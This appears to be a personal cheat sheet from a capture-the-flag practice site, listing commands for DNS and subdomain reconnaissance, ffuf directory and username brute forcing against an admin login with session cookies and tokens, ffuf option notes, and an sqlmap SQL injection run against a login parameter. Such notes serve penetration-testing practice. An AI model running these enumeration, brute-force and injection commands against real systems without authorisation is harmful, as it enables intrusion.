nslookup -type=any vulnbegin.co.uk 8.8.8.8
dnsrecon -d vulnbegin.co.uk -D ~/wordlists/subdomains.txt -t brt
https://crt.sh/
ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSm5Nbm94WVhCb1lpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI1ZTNiNTQ4M2U0YzVhMjdkZWI1Nzk1MDEyYTlmZWYyNCJ9" -u http://www.vulnbegin.co.uk/FUZZ -mc all -fc 404

ffuf -w ~/wordlists/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSm5Nbm94WVhCb1lpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI1ZTNiNTQ4M2U0YzVhMjdkZWI1Nzk1MDEyYTlmZWYyNCJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Username is invalid'

ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: token=2eff535bd75e77b62c70ba1e4dcb2873; ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSm5Nbm94WVhCb1lpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI1ZTNiNTQ4M2U0YzVhMjdkZWI1Nzk1MDEyYTlmZWYyNCJ9" -u http://www.vulnbegin.co.uk/cpadmin/FUZZ -mc all -fc 404

curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSm5Nbm94WVhCb1lpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI1ZTNiNTQ4M2U0YzVhMjdkZWI1Nzk1MDEyYTlmZWYyNCJ9" http://server.vulnbegin.co.uk

ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSm5Nbm94WVhCb1lpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI1ZTNiNTQ4M2U0YzVhMjdkZWI1Nzk1MDEyYTlmZWYyNCJ9" -u http://server.vulnbegin.co.uk/FUZZ -mc all -fc 404

-recursion # keep going
-e .back # add .bak in back of files
-s # silent mode only print output
-s | tee output.txt # print in terminal and output as well
-of json  # output format
-o output.json # output file

ffuf -u https://codingo.io/W1 -w ./wordlist.txt:W1  # multiple file locations

#importing requests
ffuf -request /tmp/request.txt -w ./wordlist.txt

# default mode is cluster mode i.e each username checked with each password in text file

# match username to corresponding password
-mode pitchfork
# more information
https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#importing-requests

once you have the token, try reconing again with that endpoint

Also if one endpoint is not accessible, another might be





python sqlmap.py -u "http://www.invoiceable.com/login" --data "ipAddress=1" -p "ipAddress" --method POST

